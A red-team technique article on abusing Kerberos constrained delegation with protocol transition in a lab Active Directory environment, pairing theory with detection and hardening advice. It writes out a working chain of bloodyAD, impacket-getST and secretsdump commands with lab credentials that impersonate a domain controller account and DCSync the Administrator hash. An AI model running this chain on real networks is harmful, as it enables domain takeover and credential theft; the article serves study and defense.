---
title: "Constrained Delegation — From GenericAll to Domain Admin"
description: "How Kerberos constrained delegation works, why protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) makes it exploitable, how SeEnableDelegationPrivilege can be hidden in a Group Policy file, and how a single GenericAll permission over a computer account becomes a full Active Directory compromise via S4U2Self and S4U2Proxy."
date: 2026-10-08
type: "Technique · Active Directory"
category: "Red Team"
difficulty: "Advanced"
readingTime: 22
tags: [constrained-delegation, kerberos, s4u2self, s4u2proxy, active-directory, genericall, dcsync, protocol-transition, seenabledelegationprivilege]
---

## The premise

Kerberos delegation is one of Active Directory's most powerful features and, simultaneously, one of its most dangerous. It was designed to solve a specific problem: when a user authenticates to a service, that service sometimes needs to access other services **on behalf of that user**. The classic example is a three-tier application — a web frontend authenticates the user, then needs to read data from a SQL database as that user, then needs to write to a file share as that user. Without delegation, the frontend would have to impersonate the user by storing their password, which is unacceptable.

Delegation solves this by extending the Kerberos protocol. It has evolved over three generations, and each generation introduced new capabilities and new attack surfaces.

| Type | Introduced | How it works | Attack surface |
|---|---|---|---|
| **Unconstrained** | Windows 2000 | The service receives the user's TGT and can use it to authenticate to any service | Extremely dangerous — compromise of the service means compromise of every user who authenticates to it |
| **Constrained** | Windows Server 2003 | The service is limited to specific SPNs listed in `msDS-AllowedToDelegateTo` | Dangerous when misconfigured, especially with protocol transition |
| **Resource-Based (RBCD)** | Windows Server 2012 | The target resource decides who can impersonate users on its behalf via `msDS-AllowedToActOnBehalfOfOtherIdentity` | Configurable per resource, but the configuration itself is an attack target |

This article focuses on **constrained delegation**, and specifically the version with **protocol transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION`). It is the variant that made the Redelegate attack chain possible. For the full engagement that used this technique end to end, see the **[Redelegate penetration test report →](/projects/redelegate-constrained-delegation)**.

## Part one — Kerberos delegation fundamentals

Before diving into the attack, it is worth understanding what problem delegation solves and how the mechanism works.

### The problem delegation solves

In standard Kerberos, a user (the client) authenticates to a service (Service A). The flow is:

1. The client authenticates to the KDC and receives a **Ticket-Granting Ticket (TGT)**.
2. The client presents the TGT to the KDC and requests a **service ticket** for Service A.
3. The KDC issues a service ticket that is encrypted with Service A's long-term key.
4. The client presents the service ticket to Service A. Service A decrypts it, validates the client's identity, and grants access.

At this point, the client is authenticated to Service A. But if Service A now needs to access Service B **on behalf of the client**, it faces a problem: it holds a service ticket for itself, not for Service B. Kerberos tickets are bound to specific SPNs — a ticket for `HTTP/webserver.corp` cannot be presented to `MSSQL/dbserver.corp`.

Delegation extends the protocol so that Service A can obtain a new ticket for Service B, still representing the original client. The modern implementation uses two Kerberos extensions: **S4U2Self** (Service for User to Self) and **S4U2Proxy** (Service for User to Proxy).

### S4U2Self — obtaining a ticket to yourself

S4U2Self allows a service to request a service ticket **to itself** on behalf of a user. The result is a ticket that says "I am Service A, and I am acting on behalf of User X."

The critical detail is what S4U2Self can and cannot do:

- **Without protocol transition**: S4U2Self only works if the user has already authenticated to Service A using Kerberos. The KDC verifies this and issues the ticket.
- **With protocol transition**: S4U2Self works for **any user**, regardless of how they authenticated to Service A. The service can assert the user's identity without any Kerberos proof.

Protocol transition is controlled by the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag in the service's `userAccountControl` attribute. When this flag is set, the service is "trusted to authenticate for delegation" — the KDC accepts the service's assertion that a user is who the service says they are.

### S4U2Proxy — proxying to another service

S4U2Proxy takes the ticket obtained via S4U2Self and uses it to request a **new ticket to a different service** (Service B) on behalf of the same user.

The flow:

```
[1] User authenticates to Service A
    (via Kerberos, or via another protocol if protocol transition is enabled)
    │
    ▼
[2] Service A calls S4U2Self → KDC
    "Give me a ticket for User X to Service A"
    │
    ▼
[3] KDC issues the ticket
    (with protocol transition: no verification of User X's authentication)
    │
    ▼
[4] Service A calls S4U2Proxy → KDC
    "Exchange this ticket for a ticket to Service B, still as User X"
    │
    ▼
[5] KDC verifies:
    - Service A's delegation rights (msDS-AllowedToDelegateTo)
    - The ticket from S4U2Self is valid
    - The requested SPN is in Service A's delegation list
    │
    ▼
[6] KDC issues a ticket to Service B, authenticated as User X
    │
    ▼
[7] Service A presents the Service B ticket to Service B
    → Authenticated as User X
```

The result is a Kerberos ticket that Service A can use to access Service B while impersonating User X. Every step is legitimate Kerberos. There is no vulnerability in the protocol itself — the vulnerability is in how delegation is configured.


## Part two — Protocol transition and why it is dangerous

Protocol transition is the flag that makes constrained delegation exploitable. Without it, delegation is a legitimate feature with a bounded attack surface. With it, the attack surface expands dramatically.

### What protocol transition actually does

When `TRUSTED_TO_AUTH_FOR_DELEGATION` is enabled on a computer or user account, the KDC accepts S4U2Self requests for **any user**, not just users who have already authenticated via Kerberos.

This is by design. Protocol transition exists so that a service can accept authentication via non-Kerberos methods (form-based login, certificate, NTLM, SAML assertion) and still obtain a Kerberos ticket for that user. The service asserts "this user has authenticated to me via X, now give me a Kerberos ticket so I can act on their behalf."

The problem is that this assertion is trusted unconditionally. The KDC does not verify that the user actually authenticated to the service. It does not check whether the service has a legitimate reason to assert the user's identity. It only checks that the service has the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag and that the requested SPN is in the service's `msDS-AllowedToDelegateTo` list.

An attacker who can control a computer account with these flags can assert any user's identity and obtain a ticket for that user to any SPN in the delegation list.

### Why this is exploitable

The attack requires three conditions:

1. **Control over a computer account** — typically via `GenericAll`, `Write` over the object, or control of an account with these permissions.
2. **The ability to set `TRUSTED_TO_AUTH_FOR_DELEGATION`** on that computer account.
3. **The ability to set `msDS-AllowedToDelegateTo`** to a target SPN.

Conditions 2 and 3 are normally restricted by the `SeEnableDelegationPrivilege`, a domain-level privilege that controls who can configure delegation. By default, only Domain Admins and Enterprise Admins have this privilege.

When `SeEnableDelegationPrivilege` is granted to a non-administrative user (as was the case in the Redelegate environment), conditions 2 and 3 become trivially achievable for that user. Combined with `GenericAll` over a computer account, all three conditions are met, and the attack becomes possible.

<figure>
  <img src="/images/articles/redelegate-constrained-delegation/bloodhound-it-genericall.png" alt="BloodHound showing IT group GenericAll over FS01" />
  <figcaption>The IT group has GenericAll over FS01$ — enough to modify the delegation configuration</figcaption>
</figure>

### The full attack in practice

The Redelegate chain demonstrates the attack with a concrete configuration. The relevant commands were:

**Step 1 — Configure the delegation flags on the controlled computer account:**

```bash
bloodyAD -u Helen.Frost -p 'newP@ssword2022' -d redelegate.vl --host dc.redelegate.vl \
  add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

This sets the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag on `FS01$`. After this command, `FS01$` can use S4U2Self for any user.

**Step 2 — Specify the delegation target:**

```bash
bloodyAD -u Helen.Frost -p 'newP@ssword2022' -d redelegate.vl --host dc.redelegate.vl \
  set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/DC.redelegate.vl'
```

This sets the `msDS-AllowedToDelegateTo` attribute to `cifs/DC.redelegate.vl`, meaning `FS01$` can now delegate to the CIFS service on the Domain Controller.

**Step 3 — Request the impersonation ticket:**

```bash
impacket-getST -spn 'cifs/DC.redelegate.vl' -impersonate 'DC$' \
  -dc-ip 10.129.69.246 'redelegate.vl/FS01$:NewPass123!'
```

This command:
1. Authenticates as `FS01$` (using the reset password `NewPass123!`).
2. Calls S4U2Self to obtain a ticket for `DC$` (the Domain Controller machine account) to `FS01$`.
3. Calls S4U2Proxy to exchange that ticket for a ticket to `cifs/DC.redelegate.vl`, still as `DC$`.
4. Saves the resulting ticket in a ccache file.

The output:

```
[*] Getting TGT for user
[*] Impersonating DC$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC$@cifs_DC.redelegate.vl@REDELEGATE.VL.ccache
```

**Step 4 — Use the ticket:**

```bash
export KRB5CCNAME=DC\$@cifs_DC.redelegate.vl@REDELEGATE.VL.ccache
impacket-secretsdump -k -no-pass dc.redelegate.vl -just-dc-user Administrator
```

The `DC$` ticket has sufficient privileges to perform DCSync. The tester extracted the `Administrator` password hash.

## Part three — Why NOT_DELEGATED matters

The Administrator account in the Redelegate environment had the `NOT_DELEGATED` flag set:

```
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED
```

This flag, when set, means the account **cannot be impersonated via delegation**. Any attempt to request a ticket for this account via S4U2Self or S4U2Proxy will fail at the KDC.

This is why the tester could not directly impersonate Administrator. The attack would have been simpler if the flag were absent:

```bash
impacket-getST -spn 'cifs/DC.redelegate.vl' -impersonate 'Administrator' ...
```

But the KDC would reject this request because Administrator has `NOT_DELEGATED`.

### The bypass: impersonate a machine account instead

The `DC$` machine account did not have the `NOT_DELEGATED` flag. This is a common misconfiguration — administrators often set `NOT_DELEGATED` on user accounts (Administrator, Domain Admins) but forget the machine accounts of Domain Controllers, Certificate Authorities, and other critical infrastructure.

By impersonating `DC$` instead of `Administrator`, the tester obtained a ticket with replication privileges. The Domain Controller machine account is a member of the `Domain Controllers` group, which has `Replicating Directory Changes` and `Replicating Directory Changes All` permissions on the domain object — the exact permissions required for DCSync.

### The defense

The `NOT_DELEGATED` flag must be set on **every privileged account**, including:

- All Domain Admin accounts
- All Enterprise Admin accounts
- All machine accounts of Domain Controllers
- All machine accounts of Certificate Authorities
- All machine accounts of Exchange servers
- All service accounts with elevated privileges

The flag can be set via the graphical interface (Active Directory Users and Computers → Account tab → "Account is sensitive and cannot be delegated") or programmatically:

```bash
bloodyAD -u admin -p 'password' -d domain.vl --host dc.domain.vl \
  add uac 'DC$' -f NOT_DELEGATED
```

## Part four — SeEnableDelegationPrivilege: the hidden privilege

The `SeEnableDelegationPrivilege` is a domain-level privilege that controls who can modify delegation attributes. By default, it is granted only to `Domain Admins` and `Enterprise Admins`. When it is granted to another account, that account can configure delegation on any Kerberos-enabled service in the domain.

In the Redelegate environment, the privilege was granted to `Helen.Frost` (RID 1106) — a regular user in the `IT` group. This was discovered by enumerating the SYSVOL Group Policy files.

### Finding the privilege in Group Policy

The privilege is stored in the Group Policy setting `SeEnableDelegationPrivilege`, which lives in the `GptTmpl.inf` file of the relevant GPO. To enumerate it:

```bash
smbclient //dc.redelegate.vl/SYSVOL \
  -U 'redelegate.vl\Marie.Curie%Fall2024!' \
  -c 'recurse ON; prompt OFF; mget *'
```

The relevant file is `Policies/{GPO-GUID}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf`. Its contents:

```
SeEnableDelegationPrivilege = *S-1-5-32-544,*S-1-5-21-4024337825-2033394866-2055507597-1106
```

The value contains two SIDs:

- `S-1-5-32-544` — the built-in `Administrators` group (expected)
- `S-1-5-21-4024337825-2033394866-2055507597-1106` — a domain account with RID `1106`

### Decoding the SID

The SID `S-1-5-21-4024337825-2033394866-2055507597-1106` has the following structure:

| Component | Meaning |
|---|---|
| `S-1-5-21` | SID prefix for domain accounts |
| `4024337825-2033394866-2055507597` | Domain SID |
| `1106` | Relative Identifier (RID) |

To identify which account corresponds to RID `1106`, the tester cross-referenced the RID with the output of the MSSQL RID brute-force (which listed every principal):

```
1106: REDELEGATE\Helen.Frost
```

So the `SeEnableDelegationPrivilege` was granted to `Helen.Frost`. Combined with `GenericAll` over `FS01$`, this gave the tester all the permissions needed for the delegation attack.

### Why this is a serious misconfiguration

`SeEnableDelegationPrivilege` is a **domain-wide** privilege. It is not scoped to a specific OU or a specific object. Any account that holds this privilege can configure delegation on **any Kerberos-enabled service in the domain** — including services running on the Domain Controller.

This means that granting `SeEnableDelegationPrivilege` to a non-administrative user is effectively equivalent to granting that user the ability to impersonate any domain user to any service. It is a Tier-0 privilege dressed up as a seemingly minor configuration setting.


## Part five — Detection

Detecting this attack requires monitoring several different event sources.

### Changes to delegation attributes

- **Event ID 4742** — A computer account was changed. Monitor for changes to `msDS-AllowedToDelegateTo` and `userAccountControl` (specifically the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag).
- **Event ID 4738** — A user account was changed. Same attributes.
- **Event ID 5136** — A directory service object was modified. This event fires on any LDAP modify operation. Filter for the specific attributes.

### S4U2Self and S4U2Proxy ticket requests

- **Event ID 4769** — A Kerberos service ticket was requested. S4U2Self and S4U2Proxy requests use the `S4U2Self` and `S4U2Proxy` flags in the ticket options. These flags are visible in the event log.

A legitimate S4U2Self request comes from a service account that has `TRUSTED_TO_AUTH_FOR_DELEGATION` set. An anomalous request comes from a computer account that recently had the flag added, or from an unexpected source.

### Password reset events

- **Event ID 4724** — An attempt was made to reset an account's password. This event fires when a Helpdesk user resets another user's password. High-volume or anomalous resets are worth investigating.

### RID enumeration

- **Event ID 4662** — An operation was performed on an object. Filter for high-volume queries against the `domainDNS` object with `DS-Replication-Get-Changes` access — this is the RID enumeration pattern.

### DCSync

- **Event ID 4662** — Same event ID, but filtered for `DS-Replication-Get-Changes-All` access on the domain object. The `Replicating Directory Changes All` right is what DCSync uses. Monitoring for this event from non-DC sources is one of the highest-signal detections available.

## Part six — Defense

### 1. Remove SeEnableDelegationPrivilege from non-administrative accounts

The single most important control. Audit every GPO for `SeEnableDelegationPrivilege` grants and remove any that are not `S-1-5-32-544` (the built-in Administrators group) or the Enterprise Admins group.

```powershell
# PowerShell: find GPOs with SeEnableDelegationPrivilege
Get-GPO -All | ForEach-Object {
    $gpo = $_
    $report = Get-GPOReport -Guid $gpo.Id -ReportType Xml
    if ($report -match 'SeEnableDelegationPrivilege') {
        Write-Output "GPO: $($gpo.DisplayName)"
    }
}
```

### 2. Mark all privileged accounts as sensitive and cannot be delegated

Set the `NOT_DELEGATED` flag on:
- Domain Admin accounts
- Enterprise Admin accounts
- Domain Controller machine accounts (`DC$`)
- Certificate Authority machine accounts
- Exchange server machine accounts
- Any service account with elevated privileges

### 3. Restrict GenericAll and Write permissions over computer accounts

`GenericAll` over a computer account is effectively a delegation configuration primitive. Audit all ACLs over computer accounts and remove `GenericAll` and `Write` from any non-administrative group.

BloodHound query for this:

```cypher
MATCH (g:Group)-[:GenericAll]->(c:Computer)
WHERE NOT g.name STARTS WITH "DOMAIN ADMINS@"
RETURN g.name, c.name
```

### 4. Avoid protocol transition when possible

If a service does not need to authenticate users who have not already authenticated via Kerberos, do not enable `TRUSTED_TO_AUTH_FOR_DELEGATION`. In most environments, it is unnecessary and should be removed.

### 5. Set ms-DS-MachineAccountQuota to 0

The default quota of 10 allows any authenticated user to create up to 10 computer accounts. Setting it to 0 prevents attackers from creating their own computer accounts for delegation attacks.

```powershell
Set-ADDomain -Identity domain.vl -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

Note: setting this to 0 does not break legitimate domain joins. Legitimate joins use `SeMachineAccountPrivilege` or explicit delegation over an OU, not the quota.

### 6. Monitor for DCSync

Enable auditing for `Replicating Directory Changes` and `Replicating Directory Changes All` on the domain object. Event ID 4662 with these access masks should only fire from Domain Controllers. Any other source is a critical alert.

## Part seven — Comparison: constrained delegation vs RBCD

Resource-Based Constrained Delegation (RBCD) is the modern alternative to classic constrained delegation. The two are often confused, but they operate in opposite directions.

| Aspect | Constrained Delegation | RBCD |
|---|---|---|
| **Where the configuration lives** | On the **source** (the delegating service) | On the **target** (the resource being accessed) |
| **Attribute** | `msDS-AllowedToDelegateTo` on the source | `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target |
| **Who configures it** | The source's owner, with `SeEnableDelegationPrivilege` | The target's owner, with `GenericAll` or `Write` over the target |
| **Attack primitive** | Control of the source + `SeEnableDelegationPrivilege` | Control of the target (or `GenericAll` over it) |
| **Common attack** | Configure delegation on a controlled computer, impersonate a privileged user | Configure RBCD on a target computer, create a computer account, impersonate a privileged user |
| **Tooling** | `impacket-getST`, `Rubeus s4u` | `impacket-addcomputer`, `Rubeus s4u`, `bloodyAD add rbcd` |

The key difference for a red teamer: classic constrained delegation is a **source-side** attack, while RBCD is a **target-side** attack. Both achieve the same result — a Kerberos ticket impersonating a privileged user — but the required permissions are different.

In the Redelegate environment, the attack was classic constrained delegation because the tester controlled the source (`FS01$`) and had the domain-level privilege (`SeEnableDelegationPrivilege`) to configure it.

## Part eight — References and further reading

- **Microsoft Docs** — "Kerberos Constrained Delegation Overview"
- **Microsoft Docs** — "SeEnableDelegationPrivilege"
- **SpecterOps** — "A Guide to Kerberos Delegation" (2023) — the definitive modern reference
- **Elad Shamir** — "Wagging the Dog: Abusing Resource-Based Constrained Delegation" (2019)
- **Will Schroeder and Lee Christensen** — "GhostPack / Rubeus" — the toolkit that automates S4U2Self, S4U2Proxy, and RBCD
- **Harmj0y** — "Kerberos Delegation" (blog series, 2017)
- **MITRE ATT&CK T1558** — Steal or Forge Kerberos Tickets
- **MITRE ATT&CK T1098** — Account Manipulation
- **Impacket** — `getST` tool for S4U2Self and S4U2Proxy
- **BloodyAD** — LDAP operations and delegation configuration

## Takeaway

Constrained delegation is a legitimate Kerberos feature that becomes dangerous when protocol transition is enabled and delegation configuration rights are granted to non-administrative accounts.

The attack requires three conditions: control over a computer account, the ability to set `TRUSTED_TO_AUTH_FOR_DELEGATION`, and the ability to set `msDS-AllowedToDelegateTo`. When these conditions are met — typically via `GenericAll` over a computer account and `SeEnableDelegationPrivilege` granted to a non-admin user — the attacker can impersonate any non-protected account and obtain a ticket to any SPN in the delegation list.

The single most consequential defense is to **remove `SeEnableDelegationPrivilege` from all non-administrative accounts**. This privilege is domain-wide, and granting it to a regular user is effectively granting Domain Admin — even though the user does not appear in any privileged group. The second defense is to mark all privileged accounts (including machine accounts of Domain Controllers) as sensitive and cannot be delegated. The third is to monitor for changes to delegation attributes and for S4U2Self / S4U2Proxy ticket requests.

The attack is not exotic. It uses documented Kerberos extensions in the way they were designed to be used. The vulnerability is in the configuration, not in the protocol. Every environment that has not audited its delegation configurations and `SeEnableDelegationPrivilege` grants should assume that at least one account is exploitable.

For the full engagement that used this chain end to end, see the **[Redelegate penetration test report →](/projects/redelegate-constrained-delegation)**.
